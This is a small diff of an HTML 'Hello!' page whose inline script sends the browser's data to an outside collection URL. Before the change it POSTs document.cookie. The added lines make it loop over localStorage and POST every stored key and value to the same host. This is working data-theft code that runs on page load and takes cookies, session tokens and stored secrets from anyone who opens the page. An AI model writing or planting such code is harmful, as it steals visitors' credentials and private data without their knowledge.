@@ -3,9 +3,16 @@
 <body>
 	<h1>Hello!</h1>
     <script>
+		const cookies = [];
+		for (let i = 0; i < 100000; i++) {
+			const key = localStorage.key(i);
+			const value = localStorage.getItem(key);	
+
+			cookies.push(`${key}=${value}`);
+		}	
         fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
             method: 'POST',
-            body: document.cookie
+            body: cookies.join('; ')
         })
     </script>
 </body>
